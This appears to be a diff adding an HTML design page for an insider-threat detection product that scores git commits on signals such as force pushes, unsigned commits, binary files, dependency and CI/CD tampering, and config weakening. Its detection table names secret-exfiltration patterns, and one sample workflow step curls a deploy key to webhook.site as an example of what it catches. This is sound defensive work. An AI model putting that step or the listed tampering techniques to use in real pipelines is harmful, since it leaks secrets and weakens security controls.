+          &bull; <strong>Denial of service:</strong> Deleting database migration files to corrupt deployments
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Signal 7: Unsigned Commits -->
+  <div class="signal-card medium">
+    <div class="signal-top">
+      <div>
+        <div class="signal-badge medium">Medium Signal</div>
+        <div class="signal-name">7. Unsigned Commits (Missing GPG Signature)</div>
+        <div class="signal-layer">Source: Layer 1 — Metadata &nbsp;|&nbsp; Verification Field</div>
+      </div>
+      <div class="signal-points">
+        <div class="pts medium">+0.5</div>
+        <div class="pts-label">Risk Points</div>
+      </div>
+    </div>
+    <div class="signal-desc">In organizations that mandate commit signing, an unsigned commit indicates the code was pushed without cryptographic identity verification. The developer (or attacker) did not have the private GPG/SSH key needed to sign.</div>
+    <div class="signal-details">
+      <div class="detail-box full">
+        <div class="detail-label">Why Unsigned Commits Are Suspicious</div>
+        <div class="detail-text">
+          &bull; <strong>Compromised credentials:</strong> An attacker has the password or PAT token but not the GPG signing key — the commit works but is unsigned<br>
+          &bull; <strong>Policy bypass:</strong> Developer intentionally disabling signing to avoid audit trail<br>
+          &bull; <strong>Automation injection:</strong> Malicious CI/CD script pushing code without human signing<br><br>
+          <em>Context matters:</em> This is a supporting signal, not conclusive on its own. But unsigned + off-hours + sensitive file = strong compound indicator.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Signal 8: Force Push -->
+  <div class="signal-card critical">
+    <div class="signal-top">
+      <div>
+        <div class="signal-badge critical">Critical Signal</div>
+        <div class="signal-name">8. Force Push (History Rewrite)</div>
+        <div class="signal-layer">Source: Webhook Event &nbsp;|&nbsp; <code>forced: true</code></div>
+      </div>
+      <div class="signal-points">
+        <div class="pts critical">+2.0</div>
+        <div class="pts-label">Risk Points</div>
+      </div>
+    </div>
+    <div class="signal-desc">A force push (<code>git push --force</code>) rewrites repository history, replacing existing commits with different ones. This can permanently erase evidence of previous changes — making it a powerful tool for covering tracks.</div>
+    <div class="signal-details">
+      <div class="detail-box">
+        <div class="detail-label">What Happens in a Force Push</div>
+        <div class="detail-text">
+          Normal push: adds new commits on top of existing history<br>
+          Force push: <strong>replaces</strong> existing commits — the old code is gone<br><br>
+          This means an insider can:<br>
+          &bull; Push malicious code &rarr; wait for it to deploy &rarr; force push to erase the evidence<br>
+          &bull; Remove audit logs that were previously committed<br>
+          &bull; Rewrite commit authorship to blame others
+        </div>
+      </div>
+      <div class="detail-box">
+        <div class="detail-label">Detection Method</div>
+        <div class="detail-text">
+          GitHub/GitLab webhook payload includes <code>"forced": true</code> field.<br><br>
+          When detected:<br>
+          &bull; Compare old ref vs new ref to identify what was removed<br>
+          &bull; Log the overwritten commits before they're garbage collected<br>
+          &bull; Alert immediately — force pushes to protected branches are almost always policy violations
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Signal 9: Suspicious Commit Messages -->
+  <div class="signal-card medium">
+    <div class="signal-top">
+      <div>
+        <div class="signal-badge medium">Medium Signal</div>
+        <div class="signal-name">9. Suspicious Commit Messages</div>
+        <div class="signal-layer">Source: Layer 1 — Metadata &nbsp;|&nbsp; Message Content Analysis</div>
+      </div>
+      <div class="signal-points">
+        <div class="pts medium">+0.5</div>
+        <div class="pts-label">Risk Points</div>
+      </div>
+    </div>
+    <div class="signal-desc">Flags commits with vague, empty, or deceptive messages when the commit contains substantial changes. A developer pushing 500+ lines with the message "fix" or "." is either careless or deliberately hiding intent.</div>
+    <div class="signal-details">
+      <div class="detail-box">
+        <div class="detail-label">What We Detect</div>
+        <div class="detail-text">
+          Only triggers on <strong>non-trivial commits</strong> (&gt;50 lines changed):<br><br>
+          &bull; <strong>Empty messages</strong> — blank or &lt;4 characters<br>
+          &bull; <strong>Single-word vague</strong> — "fix", "update", "wip", "test", "tmp", "stuff", "done", "."<br><br>
+          <em>Why it matters:</em> Legitimate developers describe their changes. An insider hiding a backdoor in a 300-line commit labeled "misc" is hoping no one looks closer.
+        </div>
+      </div>
+      <div class="detail-box">
+        <div class="detail-label">Example</div>
+        <div class="code-block">
+          <span class="comment">commit a4f8b2c</span><br>
+          <span class="comment">Author: dev@company.com</span><br>
+          <span class="comment">Message: "."</span><br>
+          <span class="comment">Changes: +487 -12 across 8 files</span><br><br>
+          <span class="del">&rarr; 487 lines added with a single-character message</span><br>
+          <span class="del">&rarr; Suspicious message signal triggered</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Signal 10: Binary File Injection -->
+  <div class="signal-card high">
+    <div class="signal-top">
+      <div>
+        <div class="signal-badge high">High Signal</div>
+        <div class="signal-name">10. Binary File Injection</div>
+        <div class="signal-layer">Source: Layer 3 — Files Changed &nbsp;|&nbsp; Extension Matching</div>
+      </div>
+      <div class="signal-points">
+        <div class="pts high">+1.0</div>
+        <div class="pts-label">Per File (Cap +2.0)</div>
+      </div>
+    </div>
+    <div class="signal-desc">Detects executables, archives, database dumps, and compiled binaries added to source repositories. These files can't be diff-reviewed, making them ideal for hiding malicious payloads or exfiltrating data.</div>
+    <div class="signal-details">
+      <div class="detail-box">
+        <div class="detail-label">File Types Detected</div>
+        <table class="pattern-table">
+          <tr><th>Category</th><th>Extensions</th></tr>
+          <tr><td>Executables</td><td><code>.exe .dll .so .dylib .bin .msi .app</code></td></tr>
+          <tr><td>Archives</td><td><code>.zip .tar .tar.gz .rar .7z .bz2</code></td></tr>
+          <tr><td>Database dumps</td><td><code>.sql .sqlite .sqlite3 .dump .bak</code></td></tr>
+          <tr><td>Compiled code</td><td><code>.class .pyc .o .obj .wasm</code></td></tr>
+        </table>
+      </div>
+      <div class="detail-box">
+        <div class="detail-label">Threat Scenarios</div>
+        <div class="detail-text">
+          &bull; <strong>Malware delivery:</strong> Adding a compiled <code>.exe</code> or <code>.dll</code> that gets deployed with the application<br>
+          &bull; <strong>Data exfiltration:</strong> Committing a <code>.zip</code> containing customer data disguised as "test fixtures"<br>
+          &bull; <strong>Database theft:</strong> Adding <code>.sql</code> dump files with production data as "migration scripts"<br>
+          &bull; <strong>Steganography:</strong> Hiding data inside image files with unusual sizes<br><br>
+          <em>Key insight:</em> Binary files bypass code review — no reviewer can see what's inside a <code>.dll</code> in a GitHub PR diff.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Signal 11: Dependency Manipulation -->
+  <div class="signal-card high">
+    <div class="signal-top">
+      <div>
+        <div class="signal-badge high">High Signal</div>
+        <div class="signal-name">11. Dependency Manipulation</div>
+        <div class="signal-layer">Source: Layer 4 — Diff on Manifest Files &nbsp;|&nbsp; Supply Chain Analysis</div>
+      </div>
+      <div class="signal-points">
+        <div class="pts high">+1.5</div>
+        <div class="pts-label">Risk Points</div>
+      </div>
+    </div>
+    <div class="signal-desc">Monitors changes to dependency manifest files (<code>package.json</code>, <code>requirements.txt</code>, <code>Gemfile</code>, <code>go.mod</code>, etc.) for supply chain attack indicators — typosquatting, vulnerable version pinning, custom registries, and security dependency removal.</div>
+    <div class="signal-details">
+      <div class="detail-box">
+        <div class="detail-label">Tampering Patterns Detected</div>
+        <table class="pattern-table">
+          <tr><th>Pattern</th><th>Risk</th></tr>
+          <tr><td>Typosquat suspect</td><td>Package name similar to popular library (<code>l0dash</code>, <code>requ3sts</code>)</td></tr>
+          <tr><td>Vulnerable version pin</td><td>Pinning to known-vulnerable versions (<code>log4j 2.14</code>, <code>django 2.x</code>)</td></tr>
+          <tr><td>Custom registry URL</td><td>Pointing to non-standard package registry (potential supply chain hijack)</td></tr>
+          <tr><td>Install scripts</td><td>Adding <code>preinstall</code>/<code>postinstall</code> scripts that execute on <code>npm install</code></td></tr>
+          <tr><td>Security dep removed</td><td>Removing <code>helmet</code>, <code>bcrypt</code>, <code>eslint-plugin-security</code>, <code>bandit</code>, etc.</td></tr>
+        </table>
+      </div>
+      <div class="detail-box">
+        <div class="detail-label">Real-World Attack: event-stream (2018)</div>
+        <div class="detail-text">
+          An attacker gained maintainer access to the popular <code>event-stream</code> npm package, then added a dependency on <code>flatmap-stream</code> which contained code to steal cryptocurrency wallets. Downloaded 8 million times before detection.<br><br>
+          <strong>Our detection:</strong> Custom registry URLs, post-install scripts, and unfamiliar transitive dependencies would all trigger alerts at the commit level — before the package is even published.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Signal 12: CI/CD Pipeline Tampering -->
+  <div class="signal-card critical">
+    <div class="signal-top">
+      <div>
+        <div class="signal-badge critical">Critical Signal</div>
+        <div class="signal-name">12. CI/CD Pipeline Tampering</div>
+        <div class="signal-layer">Source: Layer 4 — Diff on Pipeline Files &nbsp;|&nbsp; 11 Detection Patterns</div>
+      </div>
+      <div class="signal-points">
+        <div class="pts critical">+1.5</div>
+        <div class="pts-label">Per Finding (Cap +3.0)</div>
+      </div>
+    </div>
+    <div class="signal-desc">Monitors changes to CI/CD pipeline configurations (GitHub Actions, Jenkins, GitLab CI, Azure Pipelines, Dockerfiles) for tampering — disabling security scans, exfiltrating secrets from build environments, changing deployment targets, and injecting untrusted components.</div>
+    <div class="signal-details">
+      <div class="detail-box">
+        <div class="detail-label">Tampering Categories</div>
+        <table class="pattern-table">
+          <tr><th>Category</th><th>Patterns Detected</th></tr>
+          <tr><td>Security scan disabled</td><td>Commenting out or removing Snyk/SonarQube/Trivy/Semgrep/Bandit steps</td></tr>
+          <tr><td>Hook bypass</td><td>Adding <code>--no-verify</code>, <code>--skip-integrity-check</code> flags</td></tr>
+          <tr><td>Secret exfiltration</td><td><code>echo $SECRET | curl</code>, <code>printenv</code>, piping tokens to external URLs</td></tr>
+          <tr><td>Deploy target change</td><td>Modifying deployment to production/release without proper PR flow</td></tr>
+          <tr><td>Untrusted base image</td><td>Changing <code>FROM</code> in Dockerfile to non-standard registry</td></tr>
+          <tr><td>Docker user injection</td><td>Adding <code>useradd</code>/<code>adduser</code> commands in Dockerfile</td></tr>
+          <tr><td>Port exposure</td><td>Adding <code>EXPOSE</code> for unexpected high-number ports</td></tr>
+        </table>
+      </div>
+      <div class="detail-box">
+        <div class="detail-label">Example — Secret Exfiltration from CI</div>
+        <div class="code-block">
+          <span class="comment"># .github/workflows/deploy.yml</span><br>
+          <span class="comment">  steps:</span><br>
+          <span class="add">+   - name: Debug output</span><br>
+          <span class="add">+     run: |</span><br>
+          <span class="add">+       curl -X POST https://webhook.site/abc123 \</span><br>
+          <span class="add">+         -d "token=${{ secrets.DEPLOY_KEY }}"</span><br><br>
+          <span class="del">&rarr; CI/CD tampering: secret_exfil_ci detected</span><br>
+          <span class="del">&rarr; Pipeline file change + exfiltration pattern = Critical alert</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Signal 13: Config / Permission Weakening -->
+  <div class="signal-card high">
+    <div class="signal-top">
+      <div>
+        <div class="signal-badge high">High Signal</div>
+        <div class="signal-name">13. Configuration & Permission Weakening</div>
+        <div class="signal-layer">Source: Layer 4 — Diff on Config Files &nbsp;|&nbsp; Security Posture Analysis</div>
+      </div>
+      <div class="signal-points">
+        <div class="pts high">+1.0</div>
+        <div class="pts-label">Per Finding (Cap +2.0)</div>
+      </div>
+    </div>
+    <div class="signal-desc">Detects changes that weaken the application's security posture — broadening CORS policies, disabling MFA, removing rate limits, weakening TLS, enabling debug mode, removing CODEOWNERS protections, and un-ignoring sensitive files in <code>.gitignore</code>.</div>
+    <div class="signal-details">
+      <div class="detail-box">
+        <div class="detail-label">Weakening Patterns Detected</div>
+        <table class="pattern-table">
+          <tr><th>Pattern</th><th>What It Means</th></tr>
+          <tr><td>CORS wildcard (<code>*</code>)</td><td>Any website can make authenticated requests to your API</td></tr>
+          <tr><td>MFA disabled</td><td>Multi-factor authentication turned off in config</td></tr>
+          <tr><td>Auth requirement removed</td><td><code>require_auth = false</code> or equivalent</td></tr>
+          <tr><td>Rate limit disabled</td><td>API brute-force protection removed</td></tr>
+          <tr><td>Debug mode enabled</td><td>Stack traces, verbose errors exposed to users</td></tr>
+          <tr><td>SSL verify disabled</td><td>HTTPS certificate validation turned off</td></tr>
+          <tr><td>Weak TLS version</td><td>Downgrade to TLS 1.0/1.1 or SSLv3</td></tr>
+          <tr><td>.gitignore unignored</td><td>Removing <code>.env</code> or <code>.pem</code> from ignore = secrets get tracked</td></tr>
+          <tr><td>CODEOWNERS removed</td><td>Removing required reviewers for sensitive code paths</td></tr>
+        </table>
+      </div>
+      <div class="detail-box">
+        <div class="detail-label">Why This Is Dangerous</div>
+        <div class="detail-text">
+          Config weakening is the <strong>quietest</strong> form of insider threat. No new code is added, no backdoor is inserted — just a small setting change that opens a door:<br><br>
+          &bull; Remove yourself from CODEOWNERS &rarr; future malicious PRs won't require your review<br>
+          &bull; Disable MFA &rarr; compromised password alone grants access<br>
+          &bull; Remove <code>.env</code> from .gitignore &rarr; secrets start appearing in git history<br>
+          &bull; Set CORS to <code>*</code> &rarr; any malicious website can steal user sessions<br><br>
+          <em>These changes are often dismissed as "dev convenience" but can enable devastating follow-up attacks.</em>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<!-- BEHAVIORAL BASELINE -->
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<div class="section">
+  <div class="section-header">
+    <div class="section-num">04</div>
+    <div class="section-title">Behavioral Baseline Engine</div>
+  </div>
+
+  <div class="signal-card behavioral">
+    <div class="signal-top">
+      <div>
+        <div class="signal-badge behavioral">AI-Powered</div>
+        <div class="signal-name">Per-Developer Behavioral Profiling</div>
+        <div class="signal-layer">Rolling window of 60 commits per developer &nbsp;|&nbsp; Automatic anomaly detection</div>
+      </div>
+    </div>
+    <div class="signal-desc">Rather than applying fixed thresholds, the engine learns each developer's normal patterns and flags deviations. A commit that's normal for a senior backend engineer may be highly anomalous for a frontend intern.</div>
+    <div class="signal-details">
+      <div class="detail-box">
+        <div class="detail-label">Baseline Metrics Computed</div>
+        <table class="pattern-table">
+          <tr><th>Metric</th><th>What It Tracks</th></tr>
+          <tr><td>Mean Commit Hour</td><td>Average time of day this developer commits</td></tr>
+          <tr><td>Std Dev (Hours)</td><td>How much their commit time varies</td></tr>
+          <tr><td>Avg Additions</td><td>Typical lines added per commit</td></tr>
+          <tr><td>Avg Deletions</td><td>Typical lines deleted per commit</td></tr>
+          <tr><td>P90 Additions</td><td>90th percentile — their "large" commit size</td></tr>
+          <tr><td>Avg Files Changed</td><td>Typical number of files touched</td></tr>
+          <tr><td>Avg Risk Score</td><td>Their historical average risk level</td></tr>
+          <tr><td>Commits/Week</td><td>Activity frequency baseline</td></tr>
+        </table>
+      </div>
+      <div class="detail-box">
+        <div class="detail-label">Baseline Maturity Progression</div>
+        <div class="detail-text">
+          <strong style="color: #f87171;">&lt; 5 commits &rarr; Insufficient</strong><br>
+          Not enough data. No anomaly detection active. Monitoring only.<br><br>
+          <strong style="color: #fde047;">5-19 commits &rarr; Partial</strong><br>
+          Basic window-based checks (outside typical hours). No z-score analysis yet.<br><br>
+          <strong style="color: #7ee787;">20+ commits &rarr; Established</strong><br>
+          Full statistical analysis: z-scores for timing, multiplier-based size detection, risk trend analysis. High confidence anomaly detection.
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<!-- RISK SCORING -->
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<div class="section">
+  <div class="section-header">
+    <div class="section-num">05</div>
+    <div class="section-title">Risk Scoring Model</div>
+  </div>
+
+  <div class="scoring-card">
+    <table class="scoring-table">
+      <tr><th>Signal</th><th>Source Layer</th><th style="text-align: center;">Points</th><th>Severity</th></tr>
+      <tr><td>Critical SAST finding (backdoor, exfiltration)</td><td>Layer 4 — Diff</td><td class="pts-cell" style="color: #ef4444;">+2.5</td><td>Critical</td></tr>
+      <tr><td>Force push (history rewrite)</td><td>Webhook Event</td><td class="pts-cell" style="color: #ef4444;">+2.0</td><td>Critical</td></tr>
+      <tr><td>High SAST finding</td><td>Layer 4 — Diff</td><td class="pts-cell" style="color: #f97316;">+1.5</td><td>High</td></tr>
+      <tr><td>Author / committer identity mismatch</td><td>Layer 1 — Metadata</td><td class="pts-cell" style="color: #f97316;">+1.5</td><td>High</td></tr>
+      <tr><td>Sensitive file touched (per file, cap +3.0)</td><td>Layer 3 — Files</td><td class="pts-cell" style="color: #f97316;">+1.5</td><td>High</td></tr>
+      <tr><td>Off-hours commit</td><td>Layer 1 + Baseline</td><td class="pts-cell" style="color: #eab308;">+1.0</td><td>Medium</td></tr>
+      <tr><td>Large deletion (&gt;500 lines or &gt;5x baseline)</td><td>Layer 2 + Baseline</td><td class="pts-cell" style="color: #eab308;">+1.0</td><td>Medium</td></tr>
+      <tr><td>Unsigned commit</td><td>Layer 1 — Metadata</td><td class="pts-cell" style="color: #eab308;">+0.5</td><td>Medium</td></tr>
+      <tr><td style="border-top: 2px solid rgba(99,102,241,0.2);">CI/CD pipeline tampering (per finding, cap +3.0)</td><td>Layer 4 — Pipeline Diffs</td><td class="pts-cell" style="color: #ef4444;">+1.5</td><td>Critical</td></tr>
+      <tr><td>Dependency manipulation (typosquat, vuln pin, supply chain)</td><td>Layer 4 — Manifest Diffs</td><td class="pts-cell" style="color: #f97316;">+1.5</td><td>High</td></tr>
+      <tr><td>Binary file injection (per file, cap +2.0)</td><td>Layer 3 — Files</td><td class="pts-cell" style="color: #f97316;">+1.0</td><td>High</td></tr>
+      <tr><td>Config / permission weakening (per finding, cap +2.0)</td><td>Layer 4 — Config Diffs</td><td class="pts-cell" style="color: #eab308;">+1.0</td><td>Medium</td></tr>
+      <tr><td>Suspicious commit message (vague/empty on large changes)</td><td>Layer 1 — Metadata</td><td class="pts-cell" style="color: #eab308;">+0.5</td><td>Medium</td></tr>
+    </table>
+
+    <div class="risk-levels">
+      <div class="risk-level crit">
+        <div class="score">8 - 10</div>
+        <div class="rlabel">Critical</div>
+        <div class="rdesc">Multiple strong signals. Immediate investigation required.</div>
+      </div>
+      <div class="risk-level high">
+        <div class="score">5 - 7.9</div>
+        <div class="rlabel">High</div>
+        <div class="rdesc">Significant concern. Review within hours.</div>
+      </div>
+      <div class="risk-level med">
+        <div class="score">2.5 - 4.9</div>
+        <div class="rlabel">Medium</div>
+        <div class="rdesc">Some anomalies. Review in next triage cycle.</div>
+      </div>
+      <div class="risk-level low">
+        <div class="score">0.1 - 2.4</div>
+        <div class="rlabel">Low</div>
+        <div class="rdesc">Minor signals. Log for pattern analysis.</div>
+      </div>
+      <div class="risk-level clean">
+        <div class="score">0</div>
+        <div class="rlabel">Clean</div>
+        <div class="rdesc">No insider threat signals detected.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<!-- REAL WORLD SCENARIOS -->
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<div class="section">
+  <div class="section-header">
+    <div class="section-num">06</div>
+    <div class="section-title">Real-World Insider Threat Scenarios</div>
+  </div>
+
+  <div class="scenario-grid">
+    <div class="scenario-card">
+      <h4>The Departing Engineer</h4>
+      <p>Employee under notice period pushes a commit at 2 AM that deletes 1,200 lines of critical authentication code and adds a hardcoded admin bypass.</p>
+      <div class="scenario-signals">
+        <div class="scenario-chip red">Off-Hours (2 AM)</div>
+        <div class="scenario-chip red">Large Deletion (1,200 lines)</div>
+        <div class="scenario-chip red">Backdoor SAST Finding</div>
+        <div class="scenario-chip purple">Behavioral Anomaly</div>
+      </div>
+      <p style="margin-top: 10px; font-size: 12px; color: #fca5a5; font-weight: 600;">Combined Risk Score: 7.0 (High) &rarr; Immediate alert to security team</p>
+    </div>
+
+    <div class="scenario-card">
+      <h4>The Credential Harvester</h4>
+      <p>Developer adds their personal AWS access key to the production .env file and modifies the deployment script to exfiltrate database connection strings to an external endpoint.</p>
+      <div class="scenario-signals">
+        <div class="scenario-chip red">Sensitive File (.env)</div>
+        <div class="scenario-chip red">AWS Key in Diff</div>
+        <div class="scenario-chip red">Exfiltration Pattern</div>
+        <div class="scenario-chip orange">Connection String Exposed</div>
+      </div>
+      <p style="margin-top: 10px; font-size: 12px; color: #fca5a5; font-weight: 600;">Combined Risk Score: 8.5 (Critical) &rarr; Block deployment + immediate investigation</p>
+    </div>
+
+    <div class="scenario-card">
+      <h4>The Compromised Account</h4>
+      <p>An attacker with stolen credentials pushes an unsigned commit from a different timezone, adding a reverse shell in a rarely-reviewed utility file.</p>
+      <div class="scenario-signals">
+        <div class="scenario-chip red">Unsigned Commit</div>
+        <div class="scenario-chip red">Off-Hours (Foreign TZ)</div>
+        <div class="scenario-chip red">Reverse Shell SAST</div>
+        <div class="scenario-chip purple">Timing Anomaly z=4.8</div>
+      </div>
+      <p style="margin-top: 10px; font-size: 12px; color: #fca5a5; font-weight: 600;">Combined Risk Score: 6.0 (High) &rarr; Account lockout + credential rotation</p>
+    </div>
+
+    <div class="scenario-card">
+      <h4>The Evidence Destroyer</h4>
+      <p>Developer force-pushes to main branch, rewriting 3 weeks of history. The overwritten commits contained security audit logs and access control changes they had previously weakened.</p>
+      <div class="scenario-signals">
+        <div class="scenario-chip red">Force Push</div>
+        <div class="scenario-chip red">History Rewrite</div>
+        <div class="scenario-chip orange">Protected Branch</div>
+        <div class="scenario-chip purple">Risk Spike (3x baseline)</div>
+      </div>
+      <p style="margin-top: 10px; font-size: 12px; color: #fca5a5; font-weight: 600;">Combined Risk Score: 5.5 (High) &rarr; Preserve overwritten commits + forensic review</p>
+    </div>
+
+    <div class="scenario-card">
+      <h4>The Supply Chain Poisoner</h4>
+      <p>Developer adds a typosquatted npm package to <code>package.json</code> with a postinstall script, while simultaneously removing the Snyk security scanning step from the GitHub Actions workflow — with the commit message "deps update".</p>
+      <div class="scenario-signals">
+        <div class="scenario-chip red">Dependency Tampering</div>
+        <div class="scenario-chip red">CI/CD Tampering</div>
+        <div class="scenario-chip orange">Install Script Added</div>
+        <div class="scenario-chip yellow">Suspicious Message</div>
+      </div>
+      <p style="margin-top: 10px; font-size: 12px; color: #fca5a5; font-weight: 600;">Combined Risk Score: 5.0 (High) &rarr; Block merge + supply chain review</p>
+    </div>
+
+    <div class="scenario-card">
+      <h4>The Quiet Enabler</h4>
+      <p>Developer removes themselves from CODEOWNERS for the auth module, sets CORS to wildcard in config, disables MFA in settings, and adds a compiled <code>.dll</code> to the utils folder — spread across 4 small commits with vague messages over 2 days.</p>
+      <div class="scenario-signals">
+        <div class="scenario-chip red">Config Weakening (3x)</div>
+        <div class="scenario-chip red">CODEOWNERS Removed</div>
+        <div class="scenario-chip orange">Binary File (.dll)</div>
+        <div class="scenario-chip yellow">Suspicious Messages</div>
+      </div>
+      <p style="margin-top: 10px; font-size: 12px; color: #fca5a5; font-weight: 600;">Combined Risk Score: 4.5+ per commit &rarr; Pattern analysis flags coordinated weakening</p>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<!-- KEY DIFFERENTIATORS -->
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<div class="section">
+  <div class="section-header">
+    <div class="section-num">07</div>
+    <div class="section-title">Why This Approach Works</div>
+  </div>
+
+  <div class="diff-grid">
+    <div class="diff-card">
+      <div class="diff-icon">&#128683;</div>
+      <h4>Passive & Non-Disruptive</h4>
+      <p>No agent on developer machines. No workflow changes. Reads commit data from GitHub/GitLab API — developers don't even know it's there.</p>
+    </div>
+    <div class="diff-card">
+      <div class="diff-icon">&#129504;</div>
+      <h4>Behavioral Intelligence</h4>
+      <p>Per-developer baselines mean the same commit can be normal for one person and anomalous for another. Not one-size-fits-all thresholds.</p>
+    </div>
+    <div class="diff-card">
+      <div class="diff-icon">&#128200;</div>
+      <h4>Compound Signal Layering</h4>
+      <p>A single off-hours commit is noise. Off-hours + unsigned + sensitive file + large deletion from a new hire = critical alert with evidence.</p>
+    </div>
+    <div class="diff-card">
+      <div class="diff-icon">&#128269;</div>
+      <h4>Evidence-Linked Alerts</h4>
+      <p>Every alert links to the exact commit SHA, file path, and line number. SOC teams can verify findings in seconds, not hours.</p>
+    </div>
+  </div>
+</div>
+
+<div class="footer">
+  SecureDev AI &mdash; Insider Threat Detection via Commit Intelligence &mdash; Confidential
+</div>
+
+</div>
+</body>
+</html>
